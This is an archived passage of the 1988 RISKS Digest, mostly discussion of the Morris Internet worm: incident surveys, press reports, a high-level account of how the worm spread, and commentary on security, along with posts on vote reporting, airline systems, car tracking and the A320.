<DD>
<A HREF="#subj4.1">
Brad Templeton
</A><br>
<A HREF="#subj4.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Worm/virus mutations 
</A>
<DD>
<A HREF="#subj5.1">
David A. Honig
</A><br>
<A HREF="#subj5.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Worm sending messages to ernie.berkeley.edu? 
</A>
<DD>
<A HREF="#subj6.1">
Jacob Gore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: "UNIX" Worm/virus 
</A>
<DD>
<A HREF="#subj7.1">
Peter da Silva
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Comments on vote counting 
</A>
<DD>
<A HREF="#subj8.1">
"Bill Stewart and/or Shelley Rosenbaum"
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: A320 update 
</A>
<DD>
<A HREF="#subj9.1">
Henry Spencer
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Send us your Arpanet Virus War Stories 
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff@Csa4.LBL.Gov ">
cliff@Csa4.LBL.Gov 
</A>&gt;
</address>
<i>
Sun, 6 Nov 88 04:29:26 PST
</i><PRE>

 COLLECTING ARPANET VIRUS WAR STORIES

I'm collecting information about the Nov 3 Arpanet virus, trying to determine:
     &gt; How many sites were infected
     &gt; How many were not
     &gt; How quickly it spread

SO:  If you were infected, please send me a note describing your experiences. 
Please include:
     &gt; Where are you?  What type of computers?
     &gt; What times were stamped on the /usr/tmp/x files?
     &gt; Which of your computers were infected?  All of them?

Please send your anecdotes &amp; stories, such as:  
     &gt;  What time did you discover it?
     &gt;  What tipped you off?
     &gt;  How did you and your colleagues respond?
     &gt;  What would you differently?
     &gt;  Did you call anyone?  Or did anyone call you?
     &gt;  Where would you turn for information next time?
     &gt;  When did you finally eradicate it?  
     &gt;  Any weird wrinkles or strange effects?

I'm interested in hearing from you even if you were not infected!

Please pass this message on to others:
I would rather have multiple responses from a site than none.

Thank you very much for your time &amp; trouble.
In return, I'll mail summaries to everyone that contributes.
If you want this, please include your address.


Thank you very much for your time &amp; troubles!

Cliff Stoll                Harvard/Smithsonian Center for Astrophysics
617/495-7147               60 Garden Street,  Cambridge, MA 02138
Cliff@cfa200.harvard.edu   ( or on bitnet,  Cliff@lbl )   [Nov 5, '88]

   [Cliff is presumably referring to the relevant UNIX systems only.  I doubt
   he is interested in responses saying that your TOPS-20 or your PRIME 
   or whatever was not hit, since the worm/virus was specific to certain DEC
   and Sun versions.  (Thanks to Cliff for offering this service, although
   it further distracts him from his attempted pursuits of astronomy.)  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Suspect in Virus Case
</A>
</H3>
<address>
Brian M. Clapper
&lt;<A HREF="mailto:clapper@NADC.ARPA ">
clapper@NADC.ARPA 
</A>&gt;
</address>
<i>
Sun, 6 Nov 88 14:55:20 EST
</i><PRE>

Reprinted (without permission) from the Philadelphia Inquirer, Sunday,
November 6, 1988:

(From Inquirer Wire Services)
ITHACA, N.Y. - A Cornell University graduate student whose father is a top
government computer-security expert is suspected of creating the "virus" that
slowed thousands of computers nationwide, school officials said yesterday.
   The Ivy League university announced that it was investigating the computer
files of 23-year-old Robert T. Morris, Jr., as experts across the nation
assessed the unauthorized program that was injected Wednesday into a military
and university system, closing it for 24 hours.  The virus slowed an estimated
6,000 computers by replicating itself and taking up memory space, but it is not
believed to have destroyed any data.
   M. Stuart Lynn, Cornell vice president for information technologies, said
yesterday that Morris' files appeared to contain passwords giving him un-
authorized access to computers at Cornell and Stanford Universities.
   "We also have discovered that Morris' account contains a list of
passwords substantially similar to those found in the virus," he said at a
news conference.
   Although Morris "had passwords he certainly was not entitled to," Lynn
stressed, "we cannot conclude from the existence of those files that he was
responsible."
   FBI spokesman Lane Betts said the agency was investigating whether any
federal laws were violated.
   Morris, a first-year student in a doctoral computer-science program, has
a reputation as an expert computer hacker and is skilled enough to have written
the rogue program, Cornell instructor Dexter Kozen said.

   [ ... omitted details concerning Morris' unavailability for comment ... ]

   Reached at his home yesterday in Arnold, Md., Robert T. Morris, Sr., chief
scientist at the National Computer Security Center in Bethesda, Md., would not
say where his son was or comment on the case.
   The elder Morris has written widely on the security of the Unix operating
system, the target of the virus program.  He is widely known for writing a
program to decipher passwords, which give users access to computers.

   [ The remainder of the article basically restates information which has
     already been reported. ]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Internet Virus 
</A>
</H3>
<address>
"Mark W. Eichin" 
&lt;<A HREF="mailto:eichin@ATHENA.MIT.EDU">
eichin@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Fri, 4 Nov 88 21:52:58 EST
</i><PRE>

A team at MIT and a team at UCB worked Thursday evening through until Friday
morning both examining the Virus in isolation and reverse engineering to create
C code that could produce the binary output we had in hand.

MIT had a Press Conference at 12Noon Friday, 4 November; about 20 minutes
earlier, we had determined that with the modules we had received from Berkeley
and the work we had done at MIT we indeed had a complete knowledge of the inner
workings of the Virus, permitting us to declare that there was no code in the
virus designed to harm files.

The Berkeley group was lead by Keith Bostic (I don't have details on his
group); the MIT group was a collection of programmers from various
organizations including Project Athena, LCS, SIPB, and Telecom. Stan Zanarotti
and I led a group of around 6 in the reverse engineering effort, while others
worked on using Netwatch on an isolated testbed machine.

The Virus uses three possible paths to transmit itself from one
machine to another:
    1) finger (via a bug in /etc/fingerd which turned out to be
difficult for the Virus to exploit)
    2) sendmail (via the `debug' command, which should be turned
off in a production server, but apparently was turned on by default in
the binary BSD distribution)
    3) password guessing and shell/rexec/rsh/telnet logins.

Whichever method used, it attempted to run a /bin/sh on the remote
machine, and then feed it a set of commands which caused it to build a
new program and suck over an unlinked VAX or Sun image. It then linked
this with the system's local libraries, and executed it.

Once the virus was running on the new site, it chose a variety of
paths to find new hosts to propogate to:
    1) routing tables
    2) interface tables
    3) user .forward files
    4) user .rhosts files
    5) /etc/hosts.equi

Note that it did *not* make any use of the inherent security problems
commonly involved with .rhosts files, it merely used them as a source
of hostnames.

[I'll cut this short now, I need the sleep...]

Project Athena was not vulnerable to the finger attack at all; one or
two private machines were vulnerable to the `debug' attack, but at
least one was an IBM RT/PC (which the Virus could `live' on.) What did
hit several Athena machines was the use of password guessing; this is
really more of a Human Security problem than a Computer Security
problem. Other MIT machines were hit by various combinations of the
several attacks.

There were several bugs in the Virus itself, which Keith Bostic
suggested posting patches for. It also seems clear that the original
design did not intend for it to hog resources as it did, but merely to
propagate quietly, which would have certainly been interesting.

Very little effort was made to actually hide the behavior of the code
(it even had a reasonably large symbol table, making it easier to
identify subroutines.) It *did* attempt to hide at a higher level, for
example by calling itself "sh" and destroying its argument list (to
make it appear in the process table as ``some random shell script'').

I will try and post more details as I have time to write them up.

                Mark Eichin
            &lt;eichin@athena.mit.edu&gt;
        SIPB Member &amp; Project Athena ``Watchmaker''

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
RISKS of getting opinions from semi-biased sources
</A>
</H3>
<address>
Brad Templeton 
&lt;<A HREF="mailto:brad%looking.uucp@RELAY.CS.NET">
brad%looking.uucp@RELAY.CS.NET
</A>&gt;
</address>
<i>
Sun Nov  6 15:50:07 1988
</i><PRE>

It's rare for the net to make the evening news, but I'm noting some
interesting things.

Most of the media are jumping to "computer security experts" for comment
on the matter.  No offense, folks, but people who make their living from
consulting on computer security are bound to perceive (and expound on) this
as worse than it actually is.   People are talking as though there's some
surprising end-of-the-world potential in this event, when it really comes
as no surprise to any RISKS reader, Internet or UNIX user.

University systems are designed, and should be designed as low-caution, high
convenience systems.  Such flaws *will* exist, and events like this only make
us wiser.  Remember the original unix documentation which detailed "how to
bring UNIX to a halt if you're joe user" on page 1?  Funny, but it never
happens.
                                       [  "What, Never?"  "No, Never."
                                          "What, Never?"  "Hardly ever."
                                                (Thanks to W.S.Gilbert)  PGN  ]

The press will want sensationalistic answers, but if you're talking to them,
try to steer them away from all the comments about "War Games."  And clear
up the use of the word "hacker" now that things are in the public eye!

Brad Templeton, Looking Glass Software Ltd.  --  Waterloo, Ontario 519/884-7473

</PRE>
<HR><H3><A NAME="subj4.2">
Semi-biased sources
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Sun, 6 Nov 88 22:01:17 PST
</i><PRE>

This episode has given system administrators and users the opportunity to
recall that there are many lurking vulnerabilities.  But to assume that
university computing should be relatively wide open would be a serious mistake.
Unethical and other abuses are not uncommon.  There is plenty of proprietary
research, and there are serious integrity problems.  NASA contemplates
permitting a professor sitting at his workstation to up-link via network to the
space station and control his experiments in real-time.  So can anyone else who
happens to subvert the local system or its communications.  Intruders might
even be able to bring down the space station itself by penetration techniques.
Also, students writing theses would not like to see their files deleted and
their backups made unretrievable by premeditated contamination resulting from a
long-standing but not yet detected Trojan horse.  Note that many problems could
arise accidentally rather than maliciously.  In some cases accidental damage
can be just as severe as intentional damage.  (See my comments on the 1980
ARPANET fiasco, below.)  It seems that the valuable lessons that should be
derived from the worm/virus would be totally lost if we continue with business
as usual (although presumably at least the flaws already exposed will have been
patched, now that they are suddenly more widely known).  Furthermore,
significant improvements in security are in the offing -- including various
considerably more secure versions of UNIX.  (And amazingly, performance and
ease of use need not be seriously compromised!)  I think that a university
computing administrator would be strung up after an installation known *a
priori* to be badly flawed was attacked, especially if much better systems or
better operational procedures had been available and commonly used elsewhere.
Perhaps I am flogging a straw herring in mid-stream, but in the light of what
is known about the ubiquity of security vulnerabilities, it seems vastly too
dangerous for university folks to run with their heads in the sand.  [It is not
ostrich of the imagination to contemplate future attacks that are really
malicious.  And yes, they do happen and have happened.]  So, despite the the
worm/virus having caused considerable pain, it does have the potential for
having been a useful exercise -- if anyone is listening and thinking.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Worm/virus mutations 
</A>
</H3>
<address>
"David A. Honig" 
&lt;<A HREF="mailto:honig@BONNIE.ICS.UCI.EDU">
honig@BONNIE.ICS.UCI.EDU
</A>&gt;
</address>
<i>
Sun, 06 Nov 88 14:24:09 -0800
</i><PRE>

The resource-hungry arpanet worm was supposedly a mistake: it was not supposed
to use resources as fast as it did.  This was a design (programmer's) error, I
think.

I'm interested in how difficult it would have been for the intended mild worm
to "mutate" into the system-stopping one.  In particular, what would a mild
version look like, and what kind of error in reproduction would transform from
the hungry worm into the milder one?

Would simply removing a line of text from one of the scripts have worked?
Would a single undetected bit error in one character have made a difference?
(What if that error commented-out an entire line of a file?) I expect most
mutations would be fatal or sterilizing at least, but if a net-infection were
to persist uncured for a while, it is possible (and as time progresses,
probable) that mutated strains would occur, and some fraction of these would be
nastier than their ancestors.

</PRE>
<HR><H3><A NAME="subj5.2">
Re: Worm/virus mutations 
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Sun, 6 Nov 88 21:27:39 PST
</i><PRE>

In general, the difference between killer and benign could be one bit.  The
ARPANET crash of 27 Oct 1980 resulted from bits accidentally being dropped in
the time stamp of one status word.  The resulting multiplicity of three
versions (two corrupted) of the same status word (with different time stamps)
broke the garbage collection algorithm, and degraded the ARPANET to ZERO.  (See
ACM SIGSOFT Software Engineering Notes Jan 1981 for discussion of the data
retrovirus.)

The UNIX worm/virus would have been relatively harmless (and much less
detectable) had its creator not attemped to make it survivable even after
detection and removal.  The choice of a parameter invoking a one-in-ten
reinfection was what made it degrade each attacked system.  

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Worm sending messages to ernie.berkeley.edu?
</A>
</H3>
<address>
Jacob Gore 
&lt;<A HREF="mailto:gore@eecs.nwu.edu">
gore@eecs.nwu.edu
</A>&gt;
</address>
<i>
Sun, 6 Nov 88 16:36:52 CST
</i><PRE>

From The New York Times (National), Sunday, Nov. 6:

  Mr. Morris learned of his replication error through a monitoring mechnanism
  [sic] he had built into his program.  Each second each virus broadcast its
  location to a computer named Ernie at the University of California at
  Berkeley, said a computer researcher who has analyzed the virus.

Is this true?  If so, what account were the logs sent to?

Jacob Gore				Gore@EECS.NWU.Edu
Northwestern Univ., EECS Dept.		{oddjob,gargoyle,att}!nucsrl!gore

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Re: "UNIX" Worm/virus (RISKS DIGEST 7.70)
</A>
</H3>
<address>
Peter da Silva
&lt;<A HREF="mailto:peter@sugar.uu.net ">
peter@sugar.uu.net 
</A>&gt;
</address>
<i>
5 Nov 88 19:31:58 CST (Sat)
</i><PRE>
News-Path: texbell!killer!osu-cis!tut.cis.ohio-state.edu!mailrus!purdue!
   decwrl!ucbvax!KL.SRI.COM!RISKS

I realise that for most of the people in the Internet UNIX == 4.2, but people
should be more careful of referring to bugs in the UNIX operating system.
While there may be bugs in any operating system, this virus didn't exploit
any UNIX bugs.

	First, the actual bug is implicit in a mailer program, sendmail. This
isn't "The UNIX operating system", and it's not even found on most systems.

	Secondly, the other "bugs" are security holes deliberately left open
to make network operations more convenient when dealing with other trusted
machines. Again, this isn't a bug in UNIX.

	Finally, a channel like this can't be used to infect non-BSD systems
without the debug version of sendmail, unless individual users choose to set
up "shell deamons" to watch their mailboxes. This falls under case 2 above.

Referring to this is a UNIX virus is going to give naive users the idea that
UNIX is particularly susceptible to penetration over a network. Our management
has expressed concern, for example, that our own Usenet feed could be used to
infect us.

Yes, it could... given a sufficiently subtle trojan horse hidden in, say, a
comp.sources distribution. But that's not a *UNIX* or *Network* problem...
we're more susceptible to people bringing in diskettes.

The last thing we need now is the UNIX equivalent of the "Audi sudden
acceleration" panic.

		Peter da Silva  `-_-'  peter@sugar.uu.net

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Comments on vote counting
</A>
</H3>
<address>
&lt;<A HREF="mailto:wcs@alice.att.com">
wcs@alice.att.com
</A>&gt;
</address>
<i>
Sat, 5 Nov 88 23:24:33 EST
</i><PRE>
Organization: AT&amp;T Bell Labs, Holmdel NJ

Several people have commented on the risks of computerized vote tabulation,
but there's another RISK here - inaccurate and fraudulent reporting.

The National Election Service, which is the joint election reporting 
group funded 20% each by CBS, NBC, ABC, AP, and UPI, has announced that
they will not report any third-party results for the presidential
elections this year.  Ron Paul, the Libertarian Party candidate, asked
how they would report a 45%-45%-10% vote (if he gets 10% of the vote in
Alaska, an LP stronghold) - they replied "We'll call that 50-50".

This sort of thing has a major effect on voters' perceptions of the
elections - if they never hear about alternatives to the status-quo
parties, they're unlikely to vote for them in the future.  This could
get especially interesting if Lenora Fulani's New Alliance Party
succeeds in their lawsuit to keep the Democratic and Republican parties
off the Indiana ballot (where they filed late) - they may get all the
electoral votes unless there is substantial write-in voting.

# Bill Stewart, att!ho95c!wcs, AT&amp;T Bell Labs Holmdel NJ 1-201-949-0705
# and/or
# Shelley Rosenbaum, att!ho95c!slr, 1-201-949-3615   ho95c.att.com

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: A320 update
</A>
</H3>
<address>
&lt;<A HREF="mailto:attcan!utzoo!henry@uunet.UU.NET">
attcan!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sun, 6 Nov 88 02:08:09 EST
</i><PRE>

&gt;Henry Spencer's recent article on the A320's first six months in
&gt;service states that the fly-by-wire system has "behaved perfectly."
&gt;It should be noted, however, that the article he was referring
&gt;to clearly pointed out that there were failures of the primary 
&gt;flight guidance computer, which were rectified by backup systems.

Hardware failures, dealt with by backup systems, happen even in non-
computerized aircraft.  With substantial frequency, in fact.  This did
not seem worth mentioning.  As nearly as I can tell from that article,
and the later ones, there have been no major *software* problems in the
flight-control software... which is what everyone was worried about.
Hardware failures are to be expected.

&gt;I find Ziegler's rationale for the failures of the A320 somewhat 
&gt;disturbing.  With only a handful of airplanes in service, for any
&gt;significant percentage of in-flight or on-ground failures to occur,
&gt;and then say it should be compared to the massive fleets of existing
&gt;aircraft, is to obfuscate the issue.

How so?  Note that he is citing *percentages of flights* delayed, not
absolute counts; fleet size is irrelevant except insofar as statistics over
a small fleet are less precise than over a large fleet.  His comments
about media attention are more dubious in this regard, since occasional
failures in a small fleet are indeed more significant than the same
failures-per-day rate would be in a large fleet, but even there I think
he's got a point:  if ten 747s fail per day, nobody cares, but if an
A320 fails once every two weeks, it's a scandal.

&gt;His confidence in the A320's backup electrical systems is also rather
&gt;odd, considering the airplane's susceptibility to transient controls,
&gt;and his company's failure to provide even a mediocre cabin lighting
&gt;control system.

Notice that the transient problems are (as far as I've heard) all in
non-critical support systems, and the cabin-lighting-control problem is with
a subcontractor, presumably not the same people who did the main electrical
system.  Agreed that Airbus is responsible in the end, but the implication
that these problems spill over into more critical systems seems unjustified.

Henry Spencer at U of Toronto Zoology               uunet!attcan!utzoo!henry

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.70.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.72.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-24</DOCNO>
<DOCOLDNO>IA012-000131-B035-30</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.72.html 128.240.150.127 19970217023650 text/html 23145
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:35:13 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 72</TITLE>
<LINK REL="Prev" HREF="/Risks/7.71.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.73.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.71.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.73.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 72</H1>
<H2> Tuesday 8 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
The Worm/Virus -- and an Unlearned Lesson 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Airline Reservation System Vulnerabilities 
</A>
<DD>
<A HREF="#subj2.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computers in the oldest profession 
</A>
<DD>
<A HREF="#subj3.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Auto Privacy 
</A>
<DD>
<A HREF="#subj4.1">
Dave Robinson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Computer science unencumbered by fears about cutting safety margins    
</A>
<DD>
<A HREF="#subj5.1">
Jeffrey Mogul
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Risks in Answering Machines (revisited)    
</A>
<DD>
<A HREF="#subj6.1">
Amos Shapir
</A><br>
<A HREF="#subj6.2">
 Gordon Meyer
</A><br>
<A HREF="#subj6.3">
 Bob Felderman
</A><br>
<A HREF="#subj6.4">
 Greeny
</A><br>
<A HREF="#subj6.5">
 William Curtiss
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: CRT noise 
</A>
<DD>
<A HREF="#subj7.1">
Ed Ravin
</A><br>
<A HREF="#subj7.2">
 Geoffrey Welsh
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
The Worm/Virus -- and an Unlearned Lesson
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Tue, 8 Nov 88 14:03:20 PST
</i><PRE>

There have been OVER 50 MESSAGES to RISKS since last evening, and over a
hundred backlogged since Friday.  Bear with me.  I'll get to them.  I am
only human, although I try to be that as well as I can.  Things have been
fairly hectic here.

Not surprisingly, most of the pending messages deal with the RTM worm/virus
discussion, which continues with healthy discussion on propriety, morality,
ethics, prosecution, judgement, compensation, penance, etc.  The messages are
vastly too repetitive to include fully, and range wildly all over the map --
from "string him up" to "let's learn the lessons he has offered for us."  The
discussion is indeed very worthwhile, but needs significant editing to make it
palatable to our usually discriminating audience.  Thus, I thought it might be
nice to have an issue on other subjects while I am trying to get the worm
material together. Here is a potpourri of backlog.

By the way, something approaching a hundred copies of <A HREF="/Risks/7.69.html">RISKS-7.69</A> -- which have
been queued since Friday -- are still waiting on my system for the recipient
systems to accept delivery.  (<A HREF="/Risks/7.70.html">RISKS-7.70</A> and 71 also.)  I assume many sites are
STILL off the (ARPA|MIL) net.   Worse yet, we had need today to poke at a UNIX
system that claims to be up on the ARPANET but was rejecting mail.  SMTP showed
the system working.  But, guess what?  The DEBUG option still works fine on
that system! I wonder how many other system administrators have still not
learned anything yet.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Airline Reservation System Vulnerabilities
</A>
</H3>
<address>
Rodney Hoffman 
&lt;<A HREF="mailto:Hoffman.es@Xerox.COM">
Hoffman.es@Xerox.COM
</A>&gt;
</address>
<i>
4 Nov 88 12:33:11 PST (Friday)
</i><PRE>

Today's "Wall Street Journal" carries a story about American Airlines suing a
Tulsa, OK woman and her father who have credit for more than 50 million miles
in American's frequent flier program.  The airline alleges that they and
unknown co-conspirators stole the mileage by breaking into American's computer
reservations system.  They have also been indicted by a federal grand jury for
wire fraud in the alleged scheme.

The woman is an independent employee of a travel agency.  She is accused of
shifting miles from actual travelers who were not part of American Airlines
frequent flier program into fake frequent flier accounts, then redeeming for
tickets and selling those.

But the story concludes with some more general worries:

  The allegations raise some troubling questions about access to airline
  computer systems.  Such systems contain a wealth of information not only
  about frequent-flier trips, but also about the confidential travel plans of
  hundreds of companies.  And yet any employee at any travel agency can
  normally log into the agency's system and see any trips the agency has booked.
  
  "It's just too easy to get into these systems," says John Caldwell, a travel
  attorney in Washington, D.C.  "I think this is going to become an
  increasingly sensitive issue."

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computers in the oldest profession
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Wed, 2 Nov 88 13:14:59 est
</i><PRE>

From the "Backbytes" page in Computing Australia, 31st Oct 88:

``Where the Gigabyte meets garter belt

  As computer and related industry manufacturers scout for new niche
  markets, they could do worse than consider the world's oldest
  profession.  In recent months, US cops have busted several large
  prostitution rings -- all heavily dependent on microcomputer support.
  The databases held such priceless information as clients' names and
  addresses, billing methods, preferred frolics and the names of who did
  what best.  And to whom.

  How the new technocrats had missed the lucrative sales possibilities
  to this service industry is hard to fathom, as one recently raided
  establishment of easy virtue was in San Jose, in the heart of
  California's Silicon Valley.  In its computer's ledger were the names
  of more than 50,000 customers.  Obviously, a considerable horizontal
  market worth the attention of a lateral-thinking, but discreet, sales
  go-getter.''

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Auto Privacy
</A>
</H3>
<address>
DAVE ROBINSON DTN:830-6498 REO2-G/C2
&lt;<A HREF="mailto:robinson%osi.DEC@decwrl.dec.com ">
robinson%osi.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
Fri, 4 Nov 88 01:43:49 PST
</i><PRE>

In recent issues of RISKS there has been concern voiced over the ability to
trace the location of a car from its car phone.  Last night, no BBC's TOP GEAR
programme, a device deliberately designed to locate cars was described.
Essentially, it is a navigational aid designed to take into account traffic
congestion.

You tell the device your intended destination and it determines the best route.
On the way, it tells you when the turn right or left both on a dashboard
indicator and a synthesised voice. So far, nothing particularly revolutionary.

The route selected takes into account the traffic congestion on various roads.
To determine this, there are many sensors across a town. When you pass one of
these sensors, the device in your car sends a message to it. Each sensor is
connected to a central computer. This records the time taken to travel from one
sensor to another to judge the current congestion alone the route. However, the
side effect is that the central computer knows our location and route through a
city. This loss of privacy would be even greater should the scheme be extended
to cover not only the individual cities but also the interconnecting motorways
and side roads.

At present, the scheme is only in prototype. It is being developed at the
Goverment's Road Research Laboratories. However, it does indicate the sort of
devices we may be getting in the future.

To the best of my knowledge, Digital Equipment Co. has no involvement in the
project. Hence the usual disclaimers apply.
                                                     Dave Robinson

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
computer science unencumbered by fears about cutting safety margins
</A>
</H3>
<address>
Jeffrey Mogul
&lt;<A HREF="mailto:mogul@decwrl.dec.com ">
mogul@decwrl.dec.com 
</A>&gt;
</address>
<i>
2 Nov 1988 1742-PST (Wednesday)
</i><PRE>

I had to spend a few hours at the British Airways terminal at Heathrow last
week, and to help kill time I picked up a copy of the October 1988 issue of a
free magazine called "Airport".  The cover story is "Fighting for the Freedom
of the Skies: In Europe ...", and covers the European experiences with their
version of airline deregulation.  Apparently, the fragmented and uncoordinated
nature of European Air Traffic Control is causing chaos (my own flight was
delayed by ATC for 45 minutes, and our pilot told us as we left that flights
requesting clearance at that time were being told to wait for 90 minutes).

The final two paragraphs of the article made me chuckle (nervously):

    Aviation Scientists in Britain, the US, France and West Germany are
    now working on a data-exchange system which would reduce or even
    eliminate the human element in air traffic control and in airport
    approach, landing and take-off-slot technique.

[so far, so good]

    Machine-talking-to-machine would enable the system to improve
    perhaps five-fold, because the precise nature of computer science
    is unencumbered by fears about cutting safety margins too finely.  A
    cold dish of comfort, perhaps; one which will not be available until
    well after 2005.  And anyway, nobody knows yet how much such a system
    will cost.  But we all know who's going to pay for it, don't we?

The syntax of the first sentence is a little confusing, but I think the
author believes that once things are computerized there will be no need for
safety margins.  Computerization might well reduce the need for safety
margins, but this has little to do with how precise computer science is
(or is alleged to be).

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Risks in Answering Machines (revisited) (RISKS DIGEST 7.68)
</A>
</H3>
<address>
Amos Shapir
&lt;<A HREF="mailto:amos@taux02.UUCP ">
amos@taux02.UUCP 
</A>&gt;
</address>
<i>
2 Nov 88 13:16:44 GMT
</i><PRE>

Andy-Krazy-Glew writes:
